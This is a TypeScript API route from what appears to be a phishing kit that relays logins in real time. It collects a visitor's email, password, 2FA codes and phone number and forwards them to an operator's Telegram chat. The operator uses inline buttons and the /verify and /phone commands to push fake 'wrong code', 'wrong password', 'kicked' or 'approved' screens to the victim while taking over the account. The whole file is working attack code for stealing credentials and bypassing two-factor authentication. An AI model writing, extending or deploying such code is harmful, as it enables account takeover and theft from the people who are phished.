/**
 * app/api/2fa/route.ts
 *
 *   GET  /api/2fa?session=hv_...          browser polls the current state
 *   POST /api/2fa  { op: "start" | ... }  browser drives the flow
 *   POST /api/2fa  { op: "operator", ... }  fallback operator (x-operator-key)
 *
 * The operator drives the browser from Telegram:
 *   • inline keyboard buttons  (callback_query → "a|<action>|<session>")
 *   • /verify <session> <code> (shows that number on the visitor's screen)
 *   • /phone  <session> <2 digits> (last digits of the masked phone number)
 *
 * Every GET also performs one short getUpdates call (throttled to ~1.2 s) so
 * the browser learns about the operator's clicks without a webhook.
 */

import { NextResponse } from "next/server";
import {
  PANEL_ACTIONS,
  ensureState,
  getState,
  isValidSessionId,
  latestSession,
  panelKeyboard,
  panelText,
  patchState,
  resetState,
  serverTelegramConfig,
  setTelegramError,
  toPublic,
  type TwoFaState,
} from "@/lib/twofa";

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

/* ------------------------------------------------------------ telegram */

type TgResult = { ok: boolean; description?: string; result?: unknown };

async function callTelegram(method: string, payload: Record<string, unknown>): Promise<TgResult> {
  const config = serverTelegramConfig();
  if (!config) return { ok: false, description: "Telegram is not configured" };

  try {
    const res = await fetch(config.apiBase + "/bot" + config.token + "/" + method, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      cache: "no-store",
    });
    const data = (await res.json().catch(() => ({}))) as TgResult;
    if (!res.ok || data.ok === false) {
      setTelegramError(method + ": " + (data.description ?? "HTTP " + res.status));
      return { ok: false, description: data.description ?? "HTTP " + res.status };
    }
    setTelegramError(null);
    return { ok: true, result: data.result };
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    setTelegramError(method + ": " + message);
    return { ok: false, description: message };
  }
}

async function sendPanel(state: TwoFaState): Promise<boolean> {
  const config = serverTelegramConfig();
  if (!config) return false;
  const res = await callTelegram("sendMessage", {
    chat_id: config.chatId,
    text: panelText(state),
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: panelKeyboard(state.session),
  });
  if (res.ok) {
    const sent = res.result as { message_id?: number } | undefined;
    if (sent?.message_id) patchState(state.session, { messageId: sent.message_id });
  }
  return res.ok;
}

/**
 * Keeps the panel in step with the flow: rewrites the existing panel message so
 * the status line always shows the current step, and only posts a new one when
 * the panel is gone (or was never sent).
 */
async function refreshPanel(state: TwoFaState, fresh = false): Promise<boolean> {
  const config = serverTelegramConfig();
  if (!config) return false;
  if (fresh || !state.messageId) return sendPanel(state);

  const res = await callTelegram("editMessageText", {
    chat_id: config.chatId,
    message_id: state.messageId,
    text: panelText(state),
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: panelKeyboard(state.session),
  });
  // "message is not modified" just means the panel already matches.
  if (res.ok || /not modified/i.test(res.description ?? "")) return true;
  return sendPanel(state);
}

/**
 * Pings the operator chat with what the visitor just submitted (code, phone
 * number) so every input lands in Telegram without opening the panel.
 *
 * The message carries the full command keyboard, so the verdict can be sent
 * straight from the notification ("Error 2FA Code", "Done", …) — no need to
 * scroll to the session panel.
 */
async function notifyOperator(title: string, state: TwoFaState): Promise<void> {
  const config = serverTelegramConfig();
  if (!config) return;
  const esc = (value: string) =>
    value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const lines = ["<b>" + title + "</b>", ""];
  lines.push("\u2022 Email: <code>" + esc(state.email || "\u2014") + "</code>");
  if (state.submittedCode) lines.push("\u2022 Code: <code>" + esc(state.submittedCode) + "</code>");
  if (state.submittedPhone) lines.push("\u2022 Number: <code>" + esc(state.submittedPhone) + "</code>");
  lines.push("\u2022 Session: <code>" + esc(state.session) + "</code>");
  lines.push("", "Browser is on \u201CVerifying\u2026\u201D \u2014 tap a command below.");
  // The session panel stays the live message (status + result of every
  // command); this notification is a one-shot alert with the same keyboard.
  await callTelegram("sendMessage", {
    chat_id: config.chatId,
    text: lines.join("\n"),
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: panelKeyboard(state.session),
  });
}

/** Applies one panel action to a session. Returns the resulting state. */
function applyAction(session: string, action: string): TwoFaState | null {
  const mapped = PANEL_ACTIONS[action] ?? action;
  const state = getState(session) ?? ensureState(session, "");

  switch (mapped) {
    case "tap":
      return patchState(session, { status: "tap", entry: "authenticator", errorNote: null });
    case "authenticator":
      return patchState(session, {
        status: "authenticator",
        channel: "phone",
        entry: "authenticator",
        errorNote: null,
      });
    case "sms-phone":
      // "2FA Phone": the SMS has supposedly gone out, so the visitor lands
      // straight on the code box (no phone-number step).
      return patchState(session, {
        status: "sms",
        channel: "phone",
        codeSentAt: Date.now(),
        entry: "sms",
        errorNote: null,
      });
    case "sms-phone-entry":
      // "Phone Verify": ask for the phone number linked to the account
      // (masked with the last two digits set via /phone).
      return patchState(session, {
        status: "sms",
        channel: "phone",
        codeSentAt: null,
        entry: "sms",
        errorNote: null,
      });
    case "sms-whatsapp":
      return patchState(session, {
        status: "sms",
        channel: "whatsapp",
        codeSentAt: null,
        entry: "sms",
        errorNote: null,
      });
    case "sms-email":
      return patchState(session, {
        status: "sms",
        channel: "email",
        codeSentAt: null,
        entry: "sms",
        errorNote: null,
      });
    case "error_code":
      // "Error 2FA Code": back to the form the visitor typed in, with an error.
      return state.entry === "authenticator"
        ? patchState(session, { status: "authenticator", errorNote: "Wrong code. Try again." })
        : patchState(session, {
            status: "sms",
            codeSentAt: state.codeSentAt ?? Date.now(),
            errorNote: "Wrong code. Try again.",
          });
    case "error_phone":
      // "Error Phone SMS": keep the code box up and show the wrong-code
      // message under the field (same wording as "Error 2FA Code").
      return patchState(session, {
        status: "sms",
        channel: "phone",
        codeSentAt: state.codeSentAt ?? Date.now(),
        entry: "sms",
        errorNote: "Wrong code. Try again.",
      });
    case "wrong_pass":
      return patchState(session, { status: "wrong_pass" });
    case "wrong_email":
      return patchState(session, { status: "wrong_email" });
    case "kicked":
      return patchState(session, { status: "kicked" });
    case "approved":
    case "done":
      return patchState(session, { status: "approved" });
    case "sso":
      return patchState(session, { status: "sso" });
    default:
      return state;
  }
}

/* ---------------------------------------------- getUpdates (long-ish poll) */

let updateOffset = 0;
let lastPollAt = 0;
let inFlight: Promise<void> | null = null;

type OperatorCommand = {
  /** "code" → /verify, "phone" → /phone (last two digits of the number) */
  kind: "code" | "phone";
  session: string;
  value: string;
};

function verifyCommand(text: string): OperatorCommand | null {
  const raw = text.trim();
  const verify = raw.match(/^\/verify(?:@\w+)?\s+(\S+)(?:\s+(\d{1,8}))?\s*$/i);
  if (verify) {
    const [, first, second] = verify;
    if (second) return { kind: "code", session: first, value: second };
    // "/verify 31" → use the most recent updated session
    return { kind: "code", session: "", value: first };
  }
  const phone = raw.match(/^\/phone(?:@\w+)?\s+(\S+)(?:\s+(\d{1,4}))?\s*$/i);
  if (phone) {
    const [, first, second] = phone;
    if (second) return { kind: "phone", session: first, value: second };
    return { kind: "phone", session: "", value: first };
  }
  return null;
}

async function processUpdates(): Promise<void> {
  const res = await callTelegram("getUpdates", {
    offset: updateOffset,
    timeout: 0,
    limit: 20,
    allowed_updates: ["message", "callback_query"],
  });
  if (!res.ok || !Array.isArray(res.result)) return;

  for (const raw of res.result as Array<Record<string, unknown>>) {
    const updateId = typeof raw.update_id === "number" ? raw.update_id : 0;
    if (updateId >= updateOffset) updateOffset = updateId + 1;

    const callback = raw.callback_query as
      | { id: string; data?: string; from?: { first_name?: string } }
      | undefined;

    if (callback?.data) {
      const parts = callback.data.split("|");
      const session = parts.length >= 3 ? parts[2] : "";
      const action = parts.length >= 2 ? parts[1] : "";
      let toast = "Session not found";
      if (isValidSessionId(session)) {
        const next = applyAction(session, action);
        if (next) {
          void refreshPanel(next);
          const toasts: Record<string, string> = {
            auth: "Authenticator screen shown",
            tap: "Authenticator screen shown",
            ecode: "Wrong code shown",
            ephone: "Wrong code shown",
            pverify: "Phone number step shown",
            device: "Tap code " + next.tapCode + " on screen",
            wpass: "Sent back to password",
            wemail: "Sent back to email",
            kick: "Kicked back to the start",
            done: "Approved",
            sso: "SSO requested",
          };
          toast = toasts[action] ?? next.channel.toUpperCase() + " code screen";
        }
      }
      void callTelegram("answerCallbackQuery", { callback_query_id: callback.id, text: toast });
      continue;
    }

    const message = raw.message as
      | { text?: string; chat?: { id?: number | string } }
      | undefined;
    if (!message?.text) continue;

    const parsed = verifyCommand(message.text);
    if (!parsed) continue;

    const session = isValidSessionId(parsed.session) ? parsed.session : latestSession();
    if (!session) {
      void callTelegram("sendMessage", {
        chat_id: message.chat?.id ?? serverTelegramConfig()?.chatId,
        text:
          parsed.kind === "phone"
            ? "No active session. Send /phone <session> <last 2 digits>."
            : "No active session. Send /verify <session> <code>.",
      });
      continue;
    }

    if (parsed.kind === "phone") {
      // "/phone <session> 42" → the masked number on the phone-number step
      // ends in 42; the visitor is put on that step in case they are not there.
      const tail = parsed.value.replace(/\D/g, "").slice(-2) || "00";
      const shown = patchState(session, {
        phoneTail: tail,
        status: "sms",
        channel: "phone",
        codeSentAt: null,
        entry: "sms",
        errorNote: null,
      });
      if (shown) void refreshPanel(shown);
      void callTelegram("sendMessage", {
        chat_id: message.chat?.id ?? serverTelegramConfig()?.chatId,
        text:
          "\u2705 Phone number now ends in <code>" + tail + "</code> for <code>" + session + "</code>",
        parse_mode: "HTML",
      });
      continue;
    }

    const code = parsed.value;
    const current = getState(session);
    const onSms = current?.status === "sms";
    const updated = patchState(session, {
      tapCode: code,
      smsCode: code,
      status: onSms ? "sms" : "tap",
      // If the visitor is still on the phone-number step, move them to the
      // code box so the code is actually visible.
      ...(onSms && !current?.codeSentAt ? { codeSentAt: Date.now() } : {}),
      errorNote: null,
    });
    if (updated) void refreshPanel(updated);
    void callTelegram("sendMessage", {
      chat_id: message.chat?.id ?? serverTelegramConfig()?.chatId,
      text:
        "\u2705 <code>" + code + "</code> is now shown for <code>" + session + "</code>",
      parse_mode: "HTML",
    });
  }
}

function pollOnce(force = false): Promise<void> {
  if (inFlight) return inFlight;
  if (!force && Date.now() - lastPollAt < 1200) return Promise.resolve();
  lastPollAt = Date.now();
  inFlight = processUpdates()
    .catch(() => undefined)
    .finally(() => {
      inFlight = null;
    });
  return inFlight;
}

/* -------------------------------------------------------------- routes */

function readSession(value: unknown): string | null {
  return isValidSessionId(value) ? value : null;
}

export async function GET(request: Request) {
  const url = new URL(request.url);
  const session = readSession(url.searchParams.get("session"));
  if (!session) {
    return NextResponse.json({ ok: false, error: "Invalid session" }, { status: 400 });
  }

  await pollOnce();

  const state = getState(session);
  if (!state) {
    return NextResponse.json({ ok: true, found: false, configured: Boolean(serverTelegramConfig()) });
  }
  return NextResponse.json({ ok: true, found: true, state: toPublic(state) });
}

export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try {
    body = (await request.json()) as Record<string, unknown>;
  } catch {
    return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 });
  }

  const op = String(body.op ?? "");

  /* ---------------------------------------- operator fallback (no bot) */
  if (op === "operator") {
    const expected = (process.env.TWOFA_OPERATOR_KEY ?? "").trim();
    const provided = (request.headers.get("x-operator-key") ?? "").trim();
    const allowed = expected ? provided === expected : process.env.NODE_ENV !== "production";
    if (!allowed) {
      return NextResponse.json({ ok: false, error: "Forbidden" }, { status: 403 });
    }

    const session = readSession(body.session);
    if (!session) {
      return NextResponse.json({ ok: false, error: "Invalid session" }, { status: 400 });
    }

    const action = String(body.action ?? "");
    const code = typeof body.code === "string" ? body.code.trim() : "";
    let state = applyAction(session, action);
    if (code) {
      state = patchState(session, {
        tapCode: code,
        smsCode: code,
        status: action === "code" ? "sms" : getState(session)?.status ?? "tap",
      });
    }
    if (state) void refreshPanel(state);
    return NextResponse.json({ ok: true, state: state ? toPublic(state) : null });
  }

  const session = readSession(body.session);
  if (!session) {
    return NextResponse.json({ ok: false, error: "Invalid session" }, { status: 400 });
  }
  const email = typeof body.email === "string" ? body.email.trim().slice(0, 120) : "";

  switch (op) {
    case "start": {
      const password = typeof body.password === "string" ? body.password.slice(0, 200) : "";
      const state = resetState(session, email, password);
      await sendPanel(state);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "resend": {
      const state = getState(session) ?? ensureState(session, email);
      await sendPanel(state);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "channel": {
      // "Try another way" → pick phone / WhatsApp / email.
      const channel = body.channel === "whatsapp" || body.channel === "email" ? body.channel : "phone";
      const state = patchState(session, {
        status: "sms",
        channel,
        codeSentAt: null,
        entry: "sms",
        errorNote: null,
      }) ?? ensureState(session, email);
      void refreshPanel(state);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "send": {
      // Phone number typed by the visitor → Telegram, then the code screen
      // stays up until the operator sends a code or an error command.
      const phone = typeof body.phone === "string" ? body.phone.replace(/\s+/g, " ").trim().slice(0, 32) : "";
      const state = patchState(session, {
        status: "sms",
        channel: "phone",
        codeSentAt: Date.now(),
        entry: "sms",
        submittedPhone: phone || null,
        errorNote: null,
      }) ?? ensureState(session, email);
      void notifyOperator("\u{1F4F1} Phone number received", state);
      void refreshPanel(state);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "tap": {
      const state = patchState(session, { status: "tap" }) ?? ensureState(session, email);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "code": {
      // The visitor typed a code: forward it to the operator and hold the
      // browser on a spinner until the operator sends a verdict
      // (Done / Error 2FA Code / Error Phone SMS / Wrong Pass / Kick).
      const existing = getState(session);
      if (!existing) return NextResponse.json({ ok: false, error: "No active session" }, { status: 409 });
      const typed = String(body.code ?? "").replace(/\s+/g, "").slice(0, 12);
      if (!typed) {
        return NextResponse.json({ ok: false, error: "Enter the code", state: toPublic(existing) });
      }
      const entry = existing.status === "authenticator" || existing.entry === "authenticator"
        ? "authenticator"
        : "sms";
      const state = patchState(session, {
        status: "checking",
        entry,
        submittedCode: typed,
        errorNote: null,
      }) ?? existing;
      void notifyOperator("\u{1F511} Verification code received", state);
      void refreshPanel(state);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    case "reset": {
      const state = patchState(session, { status: "pending" }) ?? ensureState(session, email);
      return NextResponse.json({ ok: true, state: toPublic(state) });
    }

    default:
      return NextResponse.json({ ok: false, error: "Unknown op" }, { status: 400 });
  }
}
